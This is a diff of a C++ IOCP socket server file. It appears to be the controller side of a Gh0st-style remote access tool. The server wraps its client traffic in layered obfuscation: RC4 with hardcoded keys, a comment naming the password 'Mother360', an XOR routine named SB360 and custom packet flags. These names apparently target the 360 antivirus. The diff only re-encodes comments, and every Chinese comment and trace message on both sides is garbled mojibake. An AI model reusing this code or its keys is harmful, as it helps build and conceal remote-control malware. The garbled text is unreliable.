@@ -1,4 +1,4 @@
-// IOCPServer.cpp: implementation of the CIOCPServer class.
+ï»¿// IOCPServer.cpp: implementation of the CIOCPServer class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -18,8 +18,8 @@ static char THIS_FILE[]=__FILE__;
 
 #define HDR_SIZE	15
 
-#define ZLIB_NO  1122111		//Êı¾İ°üÎŞÑ¹ËõÄ£Ê½
-#define ZLIB_OK  1122112		//Êı¾İ°üÎªÑ¹ËõÄ£Ê½
+#define ZLIB_NO  1122111		//æ•°æ®åŒ…æ— å‹ç¼©æ¨¡å¼
+#define ZLIB_OK  1122112		//æ•°æ®åŒ…ä¸ºå‹ç¼©æ¨¡å¼
 bool CIOCPServer::m_bIsAutoD= false;
 PBYTE CIOCPServer::m_strbuff = NULL;
 //////////////////////////////////////////////////////////////////////
@@ -63,10 +63,10 @@ void rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
 
 VOID MyEncryptFunction(LPSTR szData,WORD Size)
 {
-	//RC4 ¼ÓÃÜ ÃÜÂë  Mother360
+	//RC4 åŠ å¯† å¯†ç   Mother360
 	unsigned char m_strkey0[256];
 	char bpackey_se[] = {'A','C','K','Y','Z','Q','H','9','1','\0'};
-	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //³õÊ¼»¯ RC4ÃÜÂë
+	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //åˆå§‹åŒ– RC4å¯†ç 
 	
 	rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
 	
@@ -122,11 +122,11 @@ CIOCPServer::CIOCPServer()
 	BYTE bPacketFlag[] = {'A*s%', 'n*q^', ' '};
 	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
 	char abAQd[] = {'E','w','i','n','h','P','r','o','t','o','c','o','l','H','o','s','t','y','\0'};
-	rc4_init(m_strkey,(unsigned char*)abAQd, strlen(abAQd));  //³õÊ¼»¯ RC4ÃÜÂë
+	rc4_init(m_strkey,(unsigned char*)abAQd, strlen(abAQd));  //åˆå§‹åŒ– RC4å¯†ç 
 	TRACE("--%d--\r\n",	m_listContexts.GetCount());
 }
 
-// RC4 ³õÊ¼»¯
+// RC4 åˆå§‹åŒ–
 void CIOCPServer::rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
 {
 	int i =0, j = 0, k[256] = {0};
@@ -140,12 +140,12 @@ void CIOCPServer::rc4_init(unsigned char *s, unsigned char *key, unsigned long L
 	{
 		j=(j+s[i]+k[i])%256;
 		tmp = s[i];
-		s[i] = s[j];     //½»»»s[i]ºÍs[j]
+		s[i] = s[j];     //äº¤æ¢s[i]å’Œs[j]
 		s[j] = tmp;
 	}
 }
 
-// RC4 ¼ÓÃÜ½âÃÜº¯Êı
+// RC4 åŠ å¯†è§£å¯†å‡½æ•°
 void CIOCPServer::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
 {
 	int x = 0, y = 0, t = 0;
@@ -156,7 +156,7 @@ void CIOCPServer::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long
 		x=(x+1)%256;
 		y=(y+s[x])%256;
 		tmp = s[x];
-		s[x] = s[y];     //½»»»s[x]ºÍs[y]
+		s[x] = s[y];     //äº¤æ¢s[x]å’Œs[y]
 		s[y] = tmp;
 		t=(s[x]+s[y])%256;
 		Data[i] ^= s[t];
@@ -210,7 +210,7 @@ bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMa
 	m_nMaxConnections = nMaxConnections;
 	m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);
 	
-	// ´´½¨¼àÌıÌ×½Ú×Ö£¬°ó¶¨µ½±¾µØ¶Ë¿Ú£¬½øÈë¼àÌıÄ£Ê½
+	// åˆ›å»ºç›‘å¬å¥—èŠ‚å­—ï¼Œç»‘å®šåˆ°æœ¬åœ°ç«¯å£ï¼Œè¿›å…¥ç›‘å¬æ¨¡å¼
 	if (m_socListen == INVALID_SOCKET)
 	{
 		TRACE(_T("Could not create listen socket %ld\n"),WSAGetLastError());
@@ -305,7 +305,7 @@ unsigned CIOCPServer::ThreadHeartbeat (LPVOID thisContext)
 	
 	while (pThis->m_bTimeToKill == false) 
 	{
-		// ÎªÁË×î¿ìÏìÓ¦¹Ø±ÕIOCPÏûÏ¢, ¼ì²â¼ä¸ôÎª1·ÖÖÓ
+		// ä¸ºäº†æœ€å¿«å“åº”å…³é—­IOCPæ¶ˆæ¯, æ£€æµ‹é—´éš”ä¸º1åˆ†é’Ÿ
 		for (int i = 0; i < 60 * pThis->m_nHeartBeatTime && pThis->m_bTimeToKill == false; i++)
 			Sleep(1000);
 
@@ -315,7 +315,7 @@ unsigned CIOCPServer::ThreadHeartbeat (LPVOID thisContext)
 		{
 			pContext = pThis->m_listContexts.GetNext(pos);
 			
-			// Ö»¶ÔÖ÷socket½øĞĞĞÄÌø³¬Ê±¼ì²â
+			// åªå¯¹ä¸»socketè¿›è¡Œå¿ƒè·³è¶…æ—¶æ£€æµ‹
 			if (pContext->m_bIsMainSocket)
 			{
 				BYTE bToken = 0xFF;
@@ -799,16 +799,16 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 	if (pContext == NULL)
 		return;
 	else
-	  TRACE("Send ¿ªÊ¼ ¿ªÊ¼¼ì²â»º³åÇøÊÍ·Å¶Ñ»ı\r\n");
+	  TRACE("Send å¼€å§‹ å¼€å§‹æ£€æµ‹ç¼“å†²åŒºé‡Šæ”¾å †ç§¯\r\n");
 
 	if(pContext->m_WriteBuffer.GetBufferLen() != 0)
 	{
-		TRACE("Send »º´æÇø¶Ñ»ı ²»ÄÜÖ´ĞĞ\r\n");
+		TRACE("Send ç¼“å­˜åŒºå †ç§¯ ä¸èƒ½æ‰§è¡Œ\r\n");
 		return;
 	}
-	TRACE("Send »º´æÇøÕı³£ NEXT ÁÙ½çÇø\r\n");
+	TRACE("Send ç¼“å­˜åŒºæ­£å¸¸ NEXT ä¸´ç•ŒåŒº\r\n");
 	CLock cs(pContext->m_SndLock, "Send");
-	TRACE("ÁÙ½çÇø OK \r\n");
+	TRACE("ä¸´ç•ŒåŒº OK \r\n");
 /*
 	// Wait for Data Ready signal to become available
 	WaitForSingleObject(pContext->m_hWriteComplete, INFINITE);
@@ -825,20 +825,20 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 			if (pDest == NULL)
 				return;
 			
-			if(bZlib == TRUE)  //·¢ËÍÊı¾İĞèÒªÑ¹Ëõ
+			if(bZlib == TRUE)  //å‘é€æ•°æ®éœ€è¦å‹ç¼©
 			{
-				//·ÖÅäÑ¹ËõÊı¾İµÄ¿Õ¼ä
-				bZlib = ZLIB_OK;  //Ñ¹ËõÊı¾İ
-				int	nRet = compress(pDest, &destLen, lpData, nSize);                      //Ñ¹ËõÊı¾İ
+				//åˆ†é…å‹ç¼©æ•°æ®çš„ç©ºé—´
+				bZlib = ZLIB_OK;  //å‹ç¼©æ•°æ®
+				int	nRet = compress(pDest, &destLen, lpData, nSize);                      //å‹ç¼©æ•°æ®
 				if (nRet != Z_OK)
 				{
 					delete [] pDest;
 					return;
 				}
 			}
-			else   //·¢ËÍÊı¾İ²»ĞèÒªÑ¹Ëõ
+			else   //å‘é€æ•°æ®ä¸éœ€è¦å‹ç¼©
 			{
-				bZlib = ZLIB_NO;  //ÎŞÑ¹ËõÊı¾İ
+				bZlib = ZLIB_NO;  //æ— å‹ç¼©æ•°æ®
 				destLen = nSize;
 				CopyMemory(pDest,lpData, nSize);
 			}
@@ -848,8 +848,8 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 			//////////////////////////////
 			unsigned char Sbox[256] = {0};//S-box;
 			memcpy( Sbox, m_strkey,sizeof(m_strkey));
-			rc4_crypt(Sbox,(unsigned char *)pDest,destLen);//RC4¼ÓÃÜ·¢ËÍ
-			SB360(pDest, destLen); //¼ÓÃÜ
+			rc4_crypt(Sbox,(unsigned char *)pDest,destLen);//RC4åŠ å¯†å‘é€
+			SB360(pDest, destLen); //åŠ å¯†
 			////////////////////////////////////////////
 
 
@@ -861,14 +861,14 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 			// 4 byte header [Size of UnCompress Entire Packet]
 			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
 			// Writ  Zlib nFalg
-			pContext->m_WriteBuffer.Write((PBYTE) &bZlib, sizeof(BOOL));             //Ğ´ÈëÊı¾İÊÇ·ñÑ¹Ëõ±êÖ¾
+			pContext->m_WriteBuffer.Write((PBYTE) &bZlib, sizeof(BOOL));             //å†™å…¥æ•°æ®æ˜¯å¦å‹ç¼©æ ‡å¿—
 			// Write Data
 			pContext->m_WriteBuffer.Write(pDest, destLen);
 			
 			delete [] pDest;
 			
 			
-			// Èç¹ûµ±Ç°»º³åÇøÎŞÊı¾İ¶Ñ»ı£¬Ö´ĞĞPostSend
+			// å¦‚æœå½“å‰ç¼“å†²åŒºæ— æ•°æ®å †ç§¯ï¼Œæ‰§è¡ŒPostSend
 			if (pContext->m_WriteBuffer.GetBufferLen() == nBufLen)
 			{
 				MyEncode((char *)pContext->m_WriteBuffer.GetBuffer(),pContext->m_WriteBuffer.GetBufferLen());
@@ -876,22 +876,22 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 			}
 			else
 			{
-				TRACE("ÎÒ²Ù ¿¨ÁË¿¨ÁË ¿ì¿´\r\n");
+				TRACE("æˆ‘æ“ å¡äº†å¡äº† å¿«çœ‹\r\n");
 				return;
 			}
-			// ·¢ËÍÍêºó£¬ÔÙ±¸·İÊı¾İ, ÒòÎªÓĞ¿ÉÄÜÊÇm_ResendWriteBuffer±¾ÉíÔÚ·¢ËÍ,ËùÒÔ²»Ö±½ÓĞ´Èë
+			// å‘é€å®Œåï¼Œå†å¤‡ä»½æ•°æ®, å› ä¸ºæœ‰å¯èƒ½æ˜¯m_ResendWriteBufferæœ¬èº«åœ¨å‘é€,æ‰€ä»¥ä¸ç›´æ¥å†™å…¥
 			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
 			if(lpResendWriteBuffer == NULL)  return;
 			CopyMemory(lpResendWriteBuffer, lpData, nSize);
 			pContext->m_ResendWriteBuffer.ClearBuffer();
-			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ±¸·İ·¢ËÍµÄÊı¾İ
+			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// å¤‡ä»½å‘é€çš„æ•°æ®
 			delete [] lpResendWriteBuffer;
 		}
-		else // ÒªÇóÖØ·¢
+		else // è¦æ±‚é‡å‘
 		{
 			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
 			pContext->m_ResendWriteBuffer.ClearBuffer();
-			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ±¸·İ·¢ËÍµÄÊı¾İ	
+			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// å¤‡ä»½å‘é€çš„æ•°æ®	
 		}
 		
 	}catch(...)
@@ -901,9 +901,9 @@ void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL 
 }
 
 
-void CIOCPServer::SB360(LPBYTE szData, unsigned long Size)//¼ÓÃÜ·â°üÀà³ÉÔ±
+void CIOCPServer::SB360(LPBYTE szData, unsigned long Size)//åŠ å¯†å°åŒ…ç±»æˆå‘˜
 {
-	//¸ÃÊı×éÓÃÀ´Òì»ò
+	//è¯¥æ•°ç»„ç”¨æ¥å¼‚æˆ–
 	WORD AddTable[] = {
 		3,5,8,2,9,7,4,0,3,9,2,9,1,5
 	};
@@ -997,24 +997,24 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
 		}
 		//////////////////////////////////////////////////////////////////////////
 		
-		// ½âÃÜÊı¾İ
+		// è§£å¯†æ•°æ®
 		MyDecode((char *)pContext->m_byInBuffer,dwIoSize);
 		
-		// ÒªÇóÖØĞÂ·¢ËÍ
+		// è¦æ±‚é‡æ–°å‘é€
 		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
 		{
 			Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
-			// ±ØĞëÔÙÍ¶µİÒ»¸ö½ÓÊÕÇëÇó
+			// å¿…é¡»å†æŠ•é€’ä¸€ä¸ªæ¥æ”¶è¯·æ±‚
 			PostRecv(pContext);
 			return true;
 		}
 		
-		// ±¸·İÔ­Ê¼Êı¾İ
+		// å¤‡ä»½åŸå§‹æ•°æ®
 		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);
 		
 		m_pNotifyProc((LPVOID) m_pFrame,pContext, NC_RECEIVE);
 		
-		// ¼ì²âÊı¾İ´óĞ¡
+		// æ£€æµ‹æ•°æ®å¤§å°
 		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
 		{
 			BYTE bPacketFlag[FLAG_SIZE];
@@ -1023,7 +1023,7 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
 			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
 			{
 				CString str;
-				str.Format("Êı¾İÍ·²»¶Ô IP:%s  TÏÂÏß\r\n",GetHostName(pContext->m_Socket));
+				str.Format("æ•°æ®å¤´ä¸å¯¹ IP:%s  Tä¸‹çº¿\r\n",GetHostName(pContext->m_Socket));
 				TRACE(str);
 				RemoveStaleClient(pContext, FALSE);
 				return false;
@@ -1044,7 +1044,7 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
 				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
 				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
 				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
-				pContext->m_CompressionBuffer.Read((PBYTE) &bZilb, sizeof(BOOL));             //¶ÁÈ¡Êı¾İÊÇ·ñÑ¹Ëõ
+				pContext->m_CompressionBuffer.Read((PBYTE) &bZilb, sizeof(BOOL));             //è¯»å–æ•°æ®æ˜¯å¦å‹ç¼©
 				
 				////////////////////////////////////////////////////////
 				////////////////////////////////////////////////////////
@@ -1061,13 +1061,13 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
 				SB360(pData, nCompressLength); //jiemi
 				unsigned char Sbox[256] = {0};
 				memcpy( Sbox, m_strkey,sizeof(m_strkey));
-				rc4_crypt(Sbox,(unsigned char *)pData,nCompressLength);//RC4½âÃÜ¶ÁÈ¡
+				rc4_crypt(Sbox,(unsigned char *)pData,nCompressLength);//RC4è§£å¯†è¯»å–
 
 
 
 				//////////////////////////////////////////////////////////////////////////
 				unsigned long	destLen = nUnCompressLength;
-				if(bZilb == ZLIB_OK)   //Êı¾İĞèÒª½âÑ¹Ëõ
+				if(bZilb == ZLIB_OK)   //æ•°æ®éœ€è¦è§£å‹ç¼©
 				{
 					PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
 					if(pDeCompressionData == NULL)
@@ -1089,7 +1089,7 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
 					}
 					delete [] pDeCompressionData;
 				}
-				else if(bZilb == ZLIB_NO)   //Êı¾İ²»ĞèÒª½âÑ¹Ëõ
+				else if(bZilb == ZLIB_NO)   //æ•°æ®ä¸éœ€è¦è§£å‹ç¼©
 				{
 					pContext->m_DeCompressionBuffer.ClearBuffer();
 					pContext->m_DeCompressionBuffer.Write(pData, destLen);
@@ -1110,7 +1110,7 @@ bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
  catch (...)
  {
 	 pContext->m_CompressionBuffer.ClearBuffer();
-	 // ÒªÇóÖØ·¢£¬¾Í·¢ËÍ0, ÄÚºË×Ô¶¯Ìí¼ÓÊı°ü±êÖ¾
+	 // è¦æ±‚é‡å‘ï¼Œå°±å‘é€0, å†…æ ¸è‡ªåŠ¨æ·»åŠ æ•°åŒ…æ ‡å¿—
 	 Send(pContext, NULL, 0, TRUE);
 	 PostRecv(pContext);
  }
@@ -1156,7 +1156,7 @@ void CIOCPServer::PostSend(ClientContext* pContext)
 	
 	if (nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
 	{
-		TRACE("·¢ËÍÊ§°Ü\r\n");
+		TRACE("å‘é€å¤±è´¥\r\n");
 		RemoveStaleClient( pContext, FALSE );
 		if (pOverlap)	
 			delete pOverlap;
@@ -1188,12 +1188,12 @@ bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)
 			
 			if (pContext->m_WriteBuffer.GetBufferLen() > 0)
 			{
-				TRACE("Êı¾İ¶Ñ»ı ¼ÌĞøÍ¶µİ\n");
+				TRACE("æ•°æ®å †ç§¯ ç»§ç»­æŠ•é€’\n");
 				PostSend(pContext);
 			}
 			else
 			{
-				TRACE("·¢ËÍÍê³É Çå¿ÕBuffer\n");
+				TRACE("å‘é€å®Œæˆ æ¸…ç©ºBuffer\n");
 				pContext->m_WriteBuffer.ClearBuffer();
 			}
 //			SetEvent(pContext->m_hWriteComplete);
@@ -1414,7 +1414,7 @@ ClientContext*  CIOCPServer::AllocateContext(SOCKET clientSocket)
 	
 	if (pContext != NULL)
 	{
-		// ÉèÖÃ±£»î
+		// è®¾ç½®ä¿æ´»
 		SetKeepAlive(clientSocket, m_nKeepLiveTime, m_nIntervalTime);
 
 		ZeroMemory(pContext, sizeof(ClientContext));
@@ -1422,7 +1422,7 @@ ClientContext*  CIOCPServer::AllocateContext(SOCKET clientSocket)
 		pContext->m_bIsMainSocket = FALSE;
 		pContext->m_Dialog[0] = 0;
 		pContext->m_Dialog[1] = NULL;
-//		pContext->m_hWriteComplete = CreateEvent(0,FALSE,TRUE,0);//ĞŞ¸ÄµÄ
+//		pContext->m_hWriteComplete = CreateEvent(0,FALSE,TRUE,0);//ä¿®æ”¹çš„
 		InitializeCriticalSection(&pContext->m_SndLock);
 
 		pContext->dwID=m_dwIndex++;
@@ -1485,12 +1485,12 @@ BOOL CIOCPServer::SetKeepAlive( SOCKET Socket, UINT nKeepTime /* = 10 * 1000 */,
 		return FALSE;
 	}
 	
-	// ÉèÖÃ³¬Ê±ÏêÏ¸ĞÅÏ¢ socketµÄkeep alive   VistaÖ®Ç°Ä¬ÈÏ5´Î Ö®ºóÄ¬ÈÏ·¢10´Î
+	// è®¾ç½®è¶…æ—¶è¯¦ç»†ä¿¡æ¯ socketçš„keep alive   Vistaä¹‹å‰é»˜è®¤5æ¬¡ ä¹‹åé»˜è®¤å‘10æ¬¡
 	DWORD dwBytes;
 	tcp_keepalive	klive	= {0};
-	klive.onoff				= 1;			// ¿ªÆôkeepalive
-	klive.keepalivetime		= nKeepTime;	// ¶à³¤Ê±¼äÃ»ÓĞÊı¾İ¾Í¿ªÊ¼·¢ËÍĞÄÌø°ü 5 * 1000
-	klive.keepaliveinterval	= nKeepInterval;// Ã¿¸ô¶à³¤Ê±¼ä·¢ËÍÒ»¸öĞÄÌø°ü 1000
+	klive.onoff				= 1;			// å¼€å¯keepalive
+	klive.keepalivetime		= nKeepTime;	// å¤šé•¿æ—¶é—´æ²¡æœ‰æ•°æ®å°±å¼€å§‹å‘é€å¿ƒè·³åŒ… 5 * 1000
+	klive.keepaliveinterval	= nKeepInterval;// æ¯éš”å¤šé•¿æ—¶é—´å‘é€ä¸€ä¸ªå¿ƒè·³åŒ… 1000
 	
 	if (WSAIoctl(Socket, SIO_KEEPALIVE_VALS, &klive, sizeof(tcp_keepalive), NULL, 0, &dwBytes, 0, NULL) != 0)
 	{
